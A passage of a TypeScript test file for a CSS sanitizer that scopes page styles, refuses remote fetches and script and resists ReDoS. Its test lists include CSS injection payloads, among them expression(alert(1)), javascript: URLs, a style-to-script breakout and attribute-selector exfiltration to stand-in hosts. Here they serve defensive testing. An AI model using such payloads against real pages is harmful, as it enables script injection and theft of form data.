  assert.deepEqual(hostile.dropped, ['background declaration']);
  // An unclosed open paren still fails closed on the whole rule.
  assert.equal(carryStaticStyle('.a{box-shadow:0 0 1px rgb(1,2,3;color:blue}', '[data-page="a"]').css, '');
});

test('a rule with an empty selector in its list is invalid CSS and is not a loss', () => {
  // `.a, {..}`: the whole rule is invalid in a browser, so nothing it said ever applied.
  for (const head of ['.a,', ',.a', '.a,,.b']) {
    const res = carryStaticStyle(`${head}{color:red}`, '[data-page="a"]');
    assert.equal(res.css, '', head);
    assert.equal(res.droppedRules, 0, head);
  }
  // An unsafe selector in the list is still refused and counted.
  assert.equal(carryStaticStyle('.a,[x=\\61]{color:red}', '[data-page="a"]').droppedRules, 1);
});

test('static <style> CSS with font-family, -webkit-box-orient, and -webkit-line-clamp carries with 0 dropped rules', () => {
  const css = `
    #paraaa {
      line-height: 1;
      text-overflow: ellipsis;
      -webkit-line-clamp: 2;
      overflow: hidden;
      display: -webkit-box;
      -webkit-box-orient: vertical;
      font-family: 'Catamaran', sans-serif;
    }
  `;
  const result = carryStaticStyle(css, '[data-page="Home"]');
  assert.equal(result.droppedRules, 0);
  assert.equal(
    result.css,
    "[data-page=\"Home\"] #paraaa{line-height: 1;text-overflow: ellipsis;-webkit-line-clamp: 2;overflow: hidden;display: -webkit-box;-webkit-box-orient: vertical;font-family: 'Catamaran', sans-serif}",
  );
});

test('a rule body containing a single-line comment alongside valid declarations carries valid declarations with 0 dropped rules', () => {
  const css = `
    form.form-table.label-left {
      width: inherit !important;
      // position: fixed;
      color: #103c7e;
    }
  `;
  const result = carryStaticStyle(css, '[data-page="Home"]');
  assert.equal(result.droppedRules, 0);
  assert.equal(
    result.css,
    '[data-page="Home"] form.form-table.label-left{width: inherit !important;color: #103c7e}',
  );
});

test('dangerous properties in <style> rules continue to be rejected and increment droppedRules when no safe declarations exist', () => {
  const dangerous = [
    '.a { behavior: url(x.htc); }',
    '.b { -moz-binding: url(x.xml#y); }',
    '.c { width: expression(alert(1)); }',
    '.d { background: url(//example.test/x); }',
    '.e { background: javascript:alert(1); }',
  ];
  for (const snippet of dangerous) {
    const res = carryStaticStyle(snippet, '[data-page="Home"]');
    assert.equal(res.droppedRules, 1, `expected 1 dropped rule for: ${snippet}`);
    assert.equal(res.css, '', `expected empty css for: ${snippet}`);
  }
});

test('@keyframes rules carry and rule with partial unsafe declarations keeps safe ones while counting the dropped declaration', () => {
  const css = `
    @keyframes slideInFromLeft {
      0% { transform: translateX(-100%); }
      100% { transform: translateX(0); }
    }
    .back {
      background-image: url("http://i.stack.imgur.com/kOnzy.gif");
      background-repeat: none;
      background-position: 50% 40%;
      background-size: 130px;
    }
  `;
  const result = carryStaticStyle(css, '[data-page="Home"]');
  assert.equal(result.droppedRules, 1);
  assert.equal(
    result.css,
    '@keyframes c2c-data-page-Home-slideInFromLeft{0%{transform: translateX(-100%)}100%{transform: translateX(0)}}\n[data-page="Home"] .back{background-repeat: none;background-position: 50% 40%;background-size: 130px}',
  );
});

test('nested-brace shapes in rule and keyframe bodies are dropped whole so selectors cannot escape page scope', () => {
  const mustDrop = [
    '.a{ j{; x:red} body{background:red}}',
    '.a{ q:expression{; x:red} *{display:none}}',
    '@keyframes k{0%{ j{; x:red} body{background:red}}}',
    '.a{ color:red; { background:blue } }',
    '.a{ color:red} body{display:none} .b{color:green}',
  ];
  for (const css of mustDrop.slice(0, 4)) {
    const res = carryStaticStyle(css, '[data-page="Home"]');
    assert.equal(res.css, '', `expected empty css for: ${css}`);
    assert.equal(res.droppedRules, 1, `expected 1 dropped rule for: ${css}`);
  }
});

test('built-in c2c-* @keyframes names are refused and counted as dropped, and partial @keyframes stop drops are counted', () => {
  for (const name of ['c2c-pulse', 'c2c-row-in', 'C2C-Custom']) {
    const res = carryStaticStyle(`@keyframes ${name} { 0% { opacity: 0 } 100% { opacity: 1 } }`, '[data-page="Home"]');
    assert.equal(res.css, '', `expected ${name} to be refused`);
    assert.equal(res.droppedRules, 1, `expected ${name} to count as dropped`);
  }
  const webkitRes = carryStaticStyle('@-webkit-keyframes c2c-pulse { 50% { opacity: 0.45 } }', '[data-page="Home"]');
  assert.equal(webkitRes.css, '');
  assert.equal(webkitRes.droppedRules, 1);

  const partialKf = carryStaticStyle(
    '@keyframes fade { 0% { background: url(//x.test/a); opacity: 0 } 100% { opacity: 1 } }',
    '[data-page="Home"]',
  );
  assert.equal(partialKf.css, '@keyframes c2c-data-page-Home-fade{0%{opacity: 0}100%{opacity: 1}}');
  assert.equal(partialKf.droppedRules, 1);
});

test('static <style> attack vectors never emit dangerous tokens or unscoped selectors', () => {
  const scope = '[data-page="Home"]';
  type CssRule = { selectorText?: string; cssRules?: CssRule[] };
  const selectors = (css: string): string[] => {
    const dom = new JSDOM(`<!doctype html><style>${css.replace(/</g, '')}</style>`);
    const out: string[] = [];
    const walk = (rules: CssRule[]) => {
      for (const r of rules) {
        if (r.selectorText !== undefined) out.push(r.selectorText);
        if (r.cssRules) walk(r.cssRules);
      }
    };
    const sheets = (dom.window.document as unknown as { styleSheets: Array<{ cssRules: CssRule[] }> }).styleSheets;
    walk(sheets[0]!.cssRules);
    return out;
  };
  const unscoped = (css: string) => selectors(css).filter((s) => s.split(',').some((p) => !p.trim().startsWith(scope)));
  const bad = (css: string) => /url\s*\(|image-set|expression|javascript:|behavior|-moz-binding|@import|@font-face|<|\\/i.test(css);
  const viaStyle = (body: string) => carriedStyleRules(`<div><style>${body}</style></div>`, scope);

  const cases: Record<string, string> = {
    'ent url': '.a{background:&#x75;rl(//x.test/a)}',
    'ent url dbl': '.a{background:&amp;#x75;rl(//x.test/a)}',
    'ent breakout': '.a{color:red}&lt;/style&gt;&lt;script&gt;alert(1)&lt;/script&gt;',
    'ent breakout in value': '.a{color:red&lt;/style&gt;&lt;script&gt;alert(1)}',
    'ent colon js': '.a{background:javascript&#58;alert(1)}',
    'ent expression': '.a{width:expr&#x65;ssion(alert(1))}',
    'url': '.a{color:red;background:url(//x.test/a)}',
    'image-set': '.a{background-image:image-set("//x.test/a" 1x)}',
    '@import': '@import url(//x.test/a.css); .a{color:red}',
    '@import str': '@import "//x.test/a.css"; .a{color:red}',
    '@font-face': '@font-face{font-family:x;src:url(//x.test/f)} .a{color:red}',
    'behavior': '.a{behavior:url(x.htc)}',
    'moz-binding': '.a{-moz-binding:url(x.xml#y)}',
    'expression': '.a{width:expression(alert(1))}',
    'kf url': '@keyframes k{0%{background:url(//x.test/a)}100%{color:red}}',
    'kf name injection': '@keyframes k{0%{color:red}} @keyframes x\\{ {0%{color:red}}',
    'kf head url': '@keyframes k{url(//x.test/a){color:red}}',
    'font shorthand url': ".a{font:12px 'A', url(//x.test/f)}",
    'font shorthand quote escape': ".a{font:12px 'A\\'), url(//x.test/f)'}",
    'css escape url': '.a{background:u\\72 l(//x.test/a)}',
    'line comment hide': '.a{color:red//}; background:url(//x.test/a)\n}',
    'line comment hide2': '.a{color:red;//\nbackground:url(//x.test/a)}',
    'line comment brace': '.a{ // {\n x:red} body{background:red}}',
    'recover root': 'color:red; :root{color:red}',
    'recover html/body/*': 'x;html, body, *{color:red}',
    'recover sibling': 'x; ~ header{display:none}',
    'junk brace escape': '.a{ j{; x:red} body{background:red}}',
    'unsafe-decl brace escape': '.a{ q:expression{; x:red} *{display:none}}',
    'kf brace escape': '@keyframes k{0%{ j{; x:red} body{background:red}}}',
    'attr exfil': 'input[value^=a]{background:url(//x.test/a)}',
    'attr exfil mixed': 'input[value^=a]{color:red;background-image:url(//x.test/a)}',
    'attr exfil image-set': 'input[value^=a]{color:red;background-image:image-set(url(//x.test/a) 1x)}',
  };
  for (const [name, css] of Object.entries(cases)) {
    for (const [how, r] of [['carry', carryStaticStyle(css, scope)], ['dom', viaStyle(css)]] as const) {
      assert.ok(!bad(r.css), `${name} [${how}] dangerous token survived: ${r.css}`);
      assert.deepEqual(unscoped(r.css), [], `${name} [${how}] unscoped selector emitted: ${r.css}`);
    }
  }
});

test('the rendered <style> keeps child combinators', async () => {
  const run = (await runtime()) as Runtime & { renderPage(page: unknown, doc: unknown): string };
  const doc = new JSDOM('<!doctype html><html><body></body></html>').window.document;
  const html = run.renderPage(
    { name: 'Home', label: 'Home', elements: [], scopedCss: '[data-page="Home"] .b>.c{color:red}' },
    doc,
  );
  assert.match(html, /<style>\[data-page="Home"\] \.b>\.c\{color:red\}<\/style>/);
});

test('dangerous <style> CSS is dropped and counted by name', () => {
  const { html, styleTodos } = pageModel([
    '<style>@import url(//example.test/x.css); .a { background: url(javascript:alert(1)) } .b { behavior: url(x.htc); width: expression(alert(1)) }</style><p>Hi</p>',
  ]);
  assert.equal(styleTodos.length, 1, JSON.stringify(styleTodos));
  assert.match(styleTodos[0].reason, /drops 4 static style rules or declarations \(@import, background declaration, behavior declaration, width declaration\)$/);
  assert.doesNotMatch(html[0]?.html ?? '', /import|url|expression|behavior|style/i);
  assert.equal(html[0]?.html, '<p>Hi</p>');
});

test('a page without <style> CSS gets no style TODO', () => {
  const { styleTodos } = pageModel(['<p style="color: red">Hi</p>', '<style>  /* only a comment */  </style><p>Ok</p>']);
  assert.deepEqual(styleTodos, []);
});

test('a <style> element with no CSS rules is not a counted removal', () => {
  const { model } = pageModel(['<style></style><p>Hi</p>', '<style>/* nothing here */</style><p>Ok</p>']);
  const removed = model.todos.filter((t) => /removed from this page snippet/.test(t.reason));
  assert.deepEqual(removed, [], JSON.stringify(model.todos));
});

test('style rule counting: top-level blocks and @ statements, comments and islands masked', () => {
  assert.equal(droppedStyleRules('<p>no stylesheet</p>'), 0);
  assert.equal(droppedStyleRules('<style></style>'), 0);
  assert.equal(droppedStyleRules('<style>.a{color:red}</style>'), 1);
  assert.equal(droppedStyleRules('<style>@import "x.css"; @charset "utf-8";</style>'), 2);
  assert.equal(droppedStyleRules('<style>@media print { .a { x: 1 } .b { y: 2 } }</style>'), 1);
  assert.equal(droppedStyleRules('<style>.a { color: <%=input.c%> } /* .b { } */</style>'), 1);
  assert.equal(droppedStyleRules('<style>.a { color: red }</style><div><style>.b{}.c{}</style></div>'), 3);
  assert.equal(droppedStyleRules('<style>color: red</style>'), 1, 'stray CSS text is still lost CSS');
});

test('a page snippet lists each removed script, SVG, and template tag once in sorted order', () => {
  const zml = `<zml><dsp id='html_snippet'><![CDATA[<script>bad()</script><svg><script>nested()</script></svg><style></style><template><b>hidden</b></template>]]></dsp></zml>`;
  const app: App = deriveIr(parse(`application "Demo"\n{\n\tpages\n\t{\n\t\tpage Home\n\t\t{\n\t\t\tdisplayname = "Home"\n\t\t\tContent="${delugeString(zml)}"\n\t\t}\n\t}\n}\n`));
  const model = buildModel(app);
  const todos = model.todos.filter((todo) => todo.area === 'zml' && /removed from this page snippet/.test(todo.reason));
  assert.deepEqual(todos.map((todo) => todo.reason), [
    'The <script> element is removed from this page snippet by the sanitizer',
    'The <svg> element is removed from this page snippet by the sanitizer',
    'The <template> element is removed from this page snippet by the sanitizer',
  ]);
});

test('a static page snippet counts each removed iframe, object, and embed tag', () => {
  const zml = `<zml><dsp id='html_snippet'><![CDATA[<p>Watch</p><iframe src="https://www.youtube.com/embed/abc"></iframe><object data="x.swf"></object><embed src="x.swf">]]></dsp></zml>`;
  const app: App = deriveIr(parse(`application "Demo"\n{\n\tpages\n\t{\n\t\tpage Home\n\t\t{\n\t\t\tdisplayname = "Home"\n\t\t\tContent="${delugeString(zml)}"\n\t\t}\n\t}\n}\n`));
  const model = buildModel(app);
  const todos = model.todos.filter((todo) => todo.area === 'zml' && /removed from this page snippet/.test(todo.reason));
  assert.deepEqual(todos.map((todo) => todo.reason), [
    'The <embed> element is removed from this page snippet by the sanitizer',
    'The <iframe> element is removed from this page snippet by the sanitizer',
    'The <object> element is removed from this page snippet by the sanitizer',
  ]);
  for (const todo of todos) assert.match(todo.manualStep ?? '', /Re-add it as a link to its address/);
});

test('a page snippet with carried static <style> CSS suppresses the generic style TODO', () => {
  const zml = `<zml><dsp id='html_snippet'><![CDATA[<script>bad()</script><style>.x{}</style>]]></dsp></zml>`;
  const app: App = deriveIr(parse(`application "Demo"\n{\n\tpages\n\t{\n\t\tpage Home\n\t\t{\n\t\t\tdisplayname = "Home"\n\t\t\tContent="${delugeString(zml)}"\n\t\t}\n\t}\n}\n`));
  const model = buildModel(app);
  const styleTodos = model.todos.filter((t) => t.name === 'Home.style');
  assert.equal(styleTodos.length, 0);
  assert.match(model.pages[0]?.scopedCss ?? '', /\[data-page="Home"\] \.x\{\}/);
  assert.equal(model.todos.filter((t) => t.reason === 'The <style> element is removed from this page snippet by the sanitizer').length, 0, 'no double count of <style>');
  assert.equal(model.todos.filter((t) => t.reason.includes('<script>')).length, 1);
});

test('a snippet that fails server-side compilation keeps one compile TODO without sanitizer TODOs', () => {
  const snippet = `htmlpage hp1()\ncontent\n<script>bad()</script>\n<%\nrow = insert into Orders [ Status : "open" ];\n%>`;
  const zml = `<zml><dsp id='hp1'><![CDATA[${snippet}]]></dsp></zml>`;
  const app: App = deriveIr(parse(`application "Demo"\n{\n\tpages\n\t{\n\t\tpage Home\n\t\t{\n\t\t\tdisplayname = "Home"\n\t\t\tContent=${JSON.stringify(zml)}\n\t\t}\n\t}\n}\n`));
  const model = buildModel(app);
  const pageTodos = model.todos.filter((todo) => todo.area === 'zml' && todo.name === 'Home.dsp');
  assert.equal(pageTodos.length, 1, JSON.stringify(pageTodos));
  assert.match(pageTodos[0]!.reason, /Server-side Deluge snippet requires manual translation/);
});

// ReDoS regression: the style scanners run in one pass where the old regexes
// backtracked. The three sanitizer copies (browser runtime, page generator,
// print templates) are tested against the regexes they replaced — same
// decisions on every input the regex accepted, refusals only where the new
// length caps cut in — plus adversarial inputs that finished in seconds.

type RuntimeScanners = {
  calcArgsSafe(args: string): boolean;
  stripStyleComments(value: string): string;
  replaceStyleCalls(text: string, decide: (name: string, args: string) => string): string;
};

async function runtimeScanners(): Promise<RuntimeScanners> {
  return (await import(pathToFileURL(join(process.cwd(), 'packages/ui/src/client-runtime.js')).href)) as RuntimeScanners;
}

const REGEX_CALC_ARGS = /^\s*[-+]?(?:\d+(?:\.\d*)?|\.\d+)(?:%|[a-z]{1,4})?(?:\s*[-+*/]\s*[-+]?(?:\d+(?:\.\d*)?|\.\d+)(?:%|[a-z]{1,4})?)*\s*$/i;
const REGEX_COMMENT = /\/\*[\s\S]*?\*\//g;
const REGEX_CALL = /([-a-z0-9]*)\(([^()]*)\)/gi;

/** Deterministic generator (a seeded LCG): same corpus every run, no Math.random. */
function lcg(seed: number): () => number {
  let s = seed >>> 0;
  return () => {
    s = (s * 1103515245 + 12345) >>> 0;
    return s / 0x100000000;
  };
}

test('the calc() scanner decides what the regex did, in all three sanitizers', async () => {
  const run = await runtimeScanners();
  const pick = lcg(20261016);
  const numbers = ['0', '1', '12', '1.5', '.5', '1.', '007', '+2', '-3', '+.5', '-0.', '1.2.3', '.', '+', 'e3', '1e3'];
  const units = ['', '%', 'px', 'em', 'deg', 'ms', 'abcd', 'abcde', 'e', 'PX', 'pxx'];
  const ops = ['+', '-', '*', '/'];
  const spaces = ['', ' ', '  ', '\t', '\n'];
  const corpus: string[] = [
    '1px + 2px',
    '70% - 1.5px',
    '1em*2',
    '100% / 2',
    '1px - -2px',
    '1PX + 2PX',
    '1px\n+\n2px',
    ' 1px + 2px ',
    '1e',
    '1e3px',
    '1px, 2px',
    '1px; 2px',
    'calc(1px)',
    'url(x)',
    '',
    ' ',
    '.5px + .25em',
    '1. + .5',
    '1px +',
    '+ 1px',
    '1 px',
    '1px 2px',
    '- -2px',
  ];
  for (let k = 0; k < 4000; k++) {
    let piece = '';
    const terms = 1 + Math.floor(pick() * 4);
    for (let t = 0; t < terms; t++) {
      if (t > 0) piece += spaces[Math.floor(pick() * spaces.length)] + ops[Math.floor(pick() * ops.length)] + spaces[Math.floor(pick() * spaces.length)];
      piece += numbers[Math.floor(pick() * numbers.length)] + units[Math.floor(pick() * units.length)];
    }
    if (pick() < 0.3) piece += 'xyz'.slice(0, Math.floor(pick() * 3) + 1);
    corpus.push(piece);
  }
  for (const args of corpus) {
    const expected = REGEX_CALC_ARGS.test(args);
    assert.equal(calcArgsSafe(args), expected, `pages copy: ${JSON.stringify(args)}`);
    assert.equal(printCalcArgsSafe(args), expected, `print copy: ${JSON.stringify(args)}`);
    assert.equal(run.calcArgsSafe(args), expected, `runtime copy: ${JSON.stringify(args)}`);
  }
  for (const args of ['1px+'.repeat(60) + '1px', '1'.repeat(500), '1px '.repeat(60)]) {
    assert.equal(calcArgsSafe(args), false, `pages copy over cap: ${args.slice(0, 20)}`);
    assert.equal(printCalcArgsSafe(args), false, `print copy over cap`);
    assert.equal(run.calcArgsSafe(args), false, `runtime copy over cap`);
  }
});

test('the comment stripper removes what the regex removed, in all three sanitizers', async () => {
  const run = await runtimeScanners();
  const pick = lcg(70707);
  const pieces = ['a', ';', '/', '*', '/*', '*/', ' ', 'x:y', '/*/', '/**/'];
  const corpus: string[] = [
    'a:1;/* b:2; */c:3',
    '/* only */',
    'unterminated /* comment',
    'closer with no opener */',
    '/* a /* b */ c */ d',
    '/**/',
    '/*/',
    'nested /* /* */ text',
  ];
  for (let k = 0; k < 4000; k++) {
    const count = Math.floor(pick() * 12);
    let piece = '';
    for (let t = 0; t < count; t++) piece += pieces[Math.floor(pick() * pieces.length)];
    corpus.push(piece);
  }
  for (const value of corpus) {
    const expected = value.replace(REGEX_COMMENT, '');
    assert.equal(stripStyleComments(value), expected, `pages copy: ${JSON.stringify(value)}`);
    assert.equal(printStripStyleComments(value), expected, `print copy: ${JSON.stringify(value)}`);
    assert.equal(run.stripStyleComments(value), expected, `runtime copy: ${JSON.stringify(value)}`);
  }
});

test('the call matcher rewrites what the regex rewrote, in all three sanitizers', async () => {
  const run = await runtimeScanners();
  const pick = lcg(424242);
  const mark = (name: string, args: string) => `[${name}|${args}]`;
  const pieces = ['a', 'b', '-', '0', '9', '(', ')', 'x', ' ', '.', ',', 'rgb(', 'calc('];
  const corpus: string[] = [
    'rgb(1, 2, 3)',
    'calc(1px + 2px)',
    'foo(bar)',
    'x foo(bar) y',
    'a(b c(d)',
    '(ab(cd)',
    'ab(cd',
    'foo((x))',
    'f(a)b(c)',
    'a(b)d)e(f)',
    'a (x)',
    'a-b(x)',
    '1px solid rgb(1,2,3) url(x)',
  ];
  for (let k = 0; k < 4000; k++) {
    const count = Math.floor(pick() * 14);
    let piece = '';
    for (let t = 0; t < count; t++) piece += pieces[Math.floor(pick() * pieces.length)];
    corpus.push(piece);
  }
  for (const value of corpus) {
    const expected = value.replace(REGEX_CALL, (_call, name: string, args: string) => mark(name, args));
    assert.equal(replaceStyleCalls(value, mark), expected, `pages copy: ${JSON.stringify(value)}`);
    assert.equal(printReplaceStyleCalls(value, mark), expected, `print copy: ${JSON.stringify(value)}`);
    assert.equal(
      run.replaceStyleCalls(value, (name: string, args: string) => mark(name, args)),
      expected,
      `runtime copy: ${JSON.stringify(value)}`,
    );
  }
});

test('pathological style values finish fast instead of backtracking', async () => {
  const runSnippet = await runtime();
  const runtimeSnippet = (html: string, doc: unknown) => runSnippet.sanitizeSnippet(html, doc);
  const doc = new JSDOM('<!doctype html><html><body></body></html>').window.document;
  const cases: Array<[string, () => unknown]> = [
    ['calc digits over the cap', () => cleanStyle(`width:calc(${'1'.repeat(50000)}x)`)],
    ['calc digits over the cap (print)', () => cleanPrintStyle(`width:calc(${'1'.repeat(50000)}x)`)],
    ['calc almost-expression', () => calcArgsSafe(`${'1px + '.repeat(30)}x`)],
    ['calc almost-expression (print)', () => printCalcArgsSafe(`${'1px + '.repeat(30)}x`)],
    ['comment openers', () => cleanStyle('/*'.repeat(20000))],
    ['comment openers (print)', () => cleanPrintStyle('/*'.repeat(20000))],
    ['comment openers under the cap', () => stripStyleComments(`${'/*'.repeat(3000)}a`)],
    ['unclosed call', () => cleanStyle(`width:${'a'.repeat(3000)}(${'b'.repeat(3000)}`)],
    ['unclosed call (print)', () => cleanPrintStyle(`width:${'a'.repeat(3000)}(${'b'.repeat(3000)}`)],
    ['rgb digits under the cap', () => cleanStyle(`color:rgb(${'1'.repeat(8170)}!)`)],
    ['rgb digits under the cap (print)', () => cleanPrintStyle(`color:rgb(${'1'.repeat(8170)}!)`)],
    ['rgb digits under the cap in a snippet', () => runtimeSnippet(`<div style="color:rgb(${'1'.repeat(8170)}!)">x</div>`, doc)],
    ['unclosed call in a snippet', () => runtimeSnippet(`<div style="width:${'a'.repeat(3000)}(${'b'.repeat(3000)}">x</div>`, doc)],
  ];
  for (const [label, runCase] of cases) {
    const start = performance.now();
    runCase();
    const ms = performance.now() - start;
    assert.ok(ms < 50, `${label}: ${ms.toFixed(1)}ms`);
  }
});

test('a rule keeps its safe declarations and names each refused one', () => {
  const result = carryStaticStyle('.a { color: red; background: url(https://cdn.example.test/x.png); width: 10px }', '[data-page="a"]');
  assert.equal(result.css, '[data-page="a"] .a{color: red;width: 10px}');
  assert.deepEqual(result.dropped, ['background declaration']);
  const all = carryStaticStyle('.a { background-image: url(//cdn.example.test/x.png) } .b { color: blue }', '[data-page="a"]');
  assert.equal(all.css, '[data-page="a"] .b{color: blue}', 'a rule whose every declaration is refused is left out');
  assert.deepEqual(all.dropped, ['background-image declaration']);
});

test('page sheets carry gradients, 3D transforms, filters, easing curves and content strings', () => {
  const sheet = [
    '.g { background-image: linear-gradient(to top, rgba(0, 0, 0, 0.1) 2%, #fff 100%) }',
    '.w { background-image: -webkit-gradient(linear,left top,left bottom,from(#f8f8f8),to(#f1f1f1)) }',
    '.t { transition: transform 0.35s cubic-bezier(0.56, -0.45, 0.71, 0.85), opacity 0.3s ease-in-out; transform: translate3d(10px,10px,0) scale(1) }',
    '.f { filter: brightness(70%); clip: rect(0px, 75px, 150px, 0px); font: 13px/1.3 \'Lucida Grande\',sans-serif }',
    '.c:before { content: "" } .d:after { content: \'\\f0d7\' } .e:after { content: attr(title) }',
  ].join('\n');
  const result = carryStaticStyle(sheet, '[data-page="a"]');
  assert.deepEqual(result.dropped, []);
  assert.equal(result.css.split('\n').length, 7);
  assert.match(result.css, /\[data-page="a"\] \.g\{background-image: linear-gradient\(to top, rgba\(0, 0, 0, 0\.1\) 2%, #fff 100%\)\}/);
  assert.match(result.css, /\[data-page="a"\] \.d:after\{content: '\\f0d7'\}/);
});

test('sheet-only values still refuse fetches, script, escapes and unknown functions', () => {
  const refused = [
    '.a { background-image: linear-gradient(red, blue), url(https://x.test/a.png) }',
    '.a { background-image: image-set("a.png" 1x) }',
    '.a { background-image: linear-gradient(expression(alert(1)), red) }',
    '.a { content: url(https://x.test/a.png) }',
    '.a { content: "<script>" }',
    '.a { content: "\\" }',
    '.a { content: attr(title) url(//x.test/a) }',
    '.a { transform: rotate(var(--x)) }',
    '.a { transform: rotate(var(--cssvalue-a, javascript:x)) }',
    '.a { transform: rotate(var(--cssvalue-a) url(https://x.test/a.png)) }',
    '.a { background: url(var(--cssvalue-a)) }',
    '.a { transform: translate(var(--cssvalue-A)) }',
    '.a { font: 13px \'Bad\\Name\' }',
    '.a { behavior: linear-gradient(red, blue) }',
    '.a { background-image: url(..%2fsecret.png) }',
    '.a { background-image: url(//evil.example/x.png) }',
    '.a { background-image: url(javascript:alert(1)) }',
    '.a { background-image: url(data:text/html,x) }',
    '.a { background-image: url(http://evil.example/x.png) }',
    '.a { background-image: url(a b.png) }',
    '.a { background-image: url(a\\b.png) }',
  ];
  for (const css of refused) {
    const result = carryStaticStyle(css, '[data-page="a"]');
    assert.equal(result.css, '', css);
    assert.equal(result.droppedRules, 1, css);
  }
});

test('@keyframes are carried with a page-prefixed name and the page animations follow it', () => {
  const result = carryStaticStyle(
    '.spin { animation: turn 2s linear infinite; -webkit-animation-name: turn } @keyframes turn { from { transform: rotate(0deg) } 50%, 75% { opacity: 0.5 } to { transform: rotate(360deg) } } @-webkit-keyframes turn { to { opacity: 1 } }',
    '[data-page="Home"]',
  );
  assert.deepEqual(result.dropped, []);
  assert.equal(
    result.css,
    [
      '[data-page="Home"] .spin{animation: c2c-data-page-Home-turn 2s linear infinite;-webkit-animation-name: c2c-data-page-Home-turn}',
      '@keyframes c2c-data-page-Home-turn{from{transform: rotate(0deg)}50%, 75%{opacity: 0.5}to{transform: rotate(360deg)}}',
      '@-webkit-keyframes c2c-data-page-Home-turn{to{opacity: 1}}',
    ].join('\n'),
  );
  const bad = carryStaticStyle('@keyframes x { .a { color: red } } @keyframes y { to { background: url(https://x.test/a) } } @media print { @keyframes z { to { opacity: 1 } } }', '[data-page="a"]');
  assert.equal(bad.css, '@keyframes c2c-data-page-a-y{}');
  assert.deepEqual(bad.dropped, ['@keyframes', 'background declaration', '@keyframes']);
});

test('@media written without a space before its condition is carried', () => {
  const result = carryStaticStyle('@media(min-width: 992px){ .a { width: 50% } }', '[data-page="a"]');
  assert.equal(result.css, '@media (min-width: 992px){[data-page="a"] .a{width: 50%}}');
  assert.deepEqual(result.dropped, []);
});

test('a page with a scoped rule and an @import carries the rule and counts the @import by name', () => {
  const { styleTodos, scopedCss } = pageModel([
    '<style>@import "https://cdn.example.test/theme.css"; .banner { background-image: linear-gradient(to right, #fff, #eee) }</style><p class="banner">Hi</p>',
  ]);
  assert.equal(scopedCss, '[data-page="Home"] .banner{background-image: linear-gradient(to right, #fff, #eee)}');
  assert.equal(styleTodos.length, 1, JSON.stringify(styleTodos));
  assert.equal(styleTodos[0]!.reason, 'Static <style> CSS not carried over: the page sanitizer drops 1 static style rule or declaration (@import)');
});

test('a selector opening with a combinator is refused and counted, so a page cannot style its siblings', () => {
  const escapes = ['~ *', '+ div', '> *', ' ~ nav', '/**/~ *', '/* x */+ div', '\n~ *', '\t> p', '\f+ a'];
  for (const sel of escapes) {
    const result = carryStaticStyle(`${sel} { display: none } .ok { color: red }`, '[data-page="a"]');
    assert.equal(result.css, '[data-page="a"] .ok{color: red}', JSON.stringify(sel));
    assert.deepEqual(result.dropped, ['leading combinator selector'], JSON.stringify(sel));
  }
  for (const list of ['a, ~ *', '.x,+ div', 'p , > *', 'a,/**/~ *', 'a,\n~ *']) {
    const result = carryStaticStyle(`${list} { display: none }`, '[data-page="a"]');
    assert.equal(result.css, '', JSON.stringify(list));
    assert.deepEqual(result.dropped, ['leading combinator selector'], JSON.stringify(list));
  }
  for (const css of ['@media print { ~ * { display: none } }', '@media screen { a, + div { color: red } }']) {
    const result = carryStaticStyle(css, '[data-page="a"]');
    assert.ok(!/\[data-page="a"\]\s*[~+>]/.test(result.css), result.css);
    assert.deepEqual(result.dropped, ['leading combinator selector'], css);
  }
  // Combinators between compound selectors stay inside the scope.
  const inner = carryStaticStyle('.a > .b, .c ~ .d, .e + .f { color: red }', '[data-page="a"]');
  assert.equal(inner.css, '[data-page="a"] .a > .b,[data-page="a"] .c ~ .d,[data-page="a"] .e + .f{color: red}');
  assert.deepEqual(inner.dropped, []);
});

test('an unterminated comment is counted, not dropped silently', () => {
  const result = carryStaticStyle('.a { color: red } /* .b { color: blue }', '[data-page="a"]');
  assert.equal(result.css, '[data-page="a"] .a{color: red}');
  assert.deepEqual(result.dropped, ['unterminated comment']);
  assert.deepEqual(carryStaticStyle('.a { color: red } /* closed */', '[data-page="a"]').dropped, []);
});

test('a form feed inside a content string is refused', () => {
  const result = carryStaticStyle('.a::after { content: "a\fb" } .b::after { content: "ab" }', '[data-page="a"]');
  assert.equal(result.css, '[data-page="a"] .b::after{content: "ab"}');
  assert.deepEqual(result.dropped, ['content declaration']);
});

test('a page name with a long dash run builds its keyframe prefix in linear time', () => {
  const scope = `[data-page="a${'-'.repeat(100_000)}a"]`;
  const started = performance.now();
  const result = carryStaticStyle('@keyframes k { to { opacity: 1 } }', scope);
  const elapsed = performance.now() - started;
  assert.ok(elapsed < 50, `${elapsed.toFixed(1)} ms`);
  assert.ok(result.css.startsWith(`@keyframes c2c-data-page-a${'-'.repeat(100_000)}a-k{`), result.css.slice(0, 40));
  assert.ok(carryStaticStyle('@keyframes k { to { opacity: 1 } }', '[data-page="P"]').css.startsWith('@keyframes c2c-data-page-P-k{'));
});

test('a sheet keeps url() targets that can only fetch the page origin and refuses every remote one', () => {
  const carried = carryStaticStyle(
    [
      '.a { background-image: url(/creator/live/images/bg.png) }',
      '.b { background: url(./img/p.png) no-repeat }',
      '.c { list-style-image: url(../icons/dot.png) }',
      '.d { cursor: url(#cursor-1), auto }',
      '.e { background-image: url(icon.png) }',
    ].join('\n'),
    '[data-page="a"]',
  );
  assert.deepEqual(carried.dropped, []);
  assert.equal(
    carried.css,
    [
      '[data-page="a"] .a{background-image: url(/creator/live/images/bg.png)}',
      '[data-page="a"] .b{background: url(./img/p.png) no-repeat}',
      '[data-page="a"] .c{list-style-image: url(../icons/dot.png)}',
      '[data-page="a"] .d{cursor: url(#cursor-1), auto}',
      '[data-page="a"] .e{background-image: url(icon.png)}',
    ].join('\n'),
  );
  for (const css of [
    '.a { background-image: url(//cdn.example.test/x.png) }',
    '.a { background-image: url(http://i.example.test/x.gif) }',
    '.a { background-image: url(https://x.test/a.png) }',
    '.a { background-image: url(data:text/html;base64,AAAA) }',
    '.a { background-image: url(javascript:alert(1)) }',
    '.a { background: url(//x.test/a), url(/y.png) }',
    '.a { background-image: url( ) }',
  ]) {
    const result = carryStaticStyle(css, '[data-page="a"]');
    assert.equal(result.css, '', css);
    assert.equal(result.droppedRules, 1, css);
  }
});

test('a Creator @media written without inner braces wraps its single rule under the media', () => {
  const result = carryStaticStyle(
    '@media (max-width: 673px) .TimeLine li:last-child label { left: -2.8%; }\n@media(min-width : 993px)\n.chartDiv\n{ height : 275px; }',
    '[data-page="a"]',
  );
  assert.deepEqual(result.dropped, []);
  assert.equal(
    result.css,
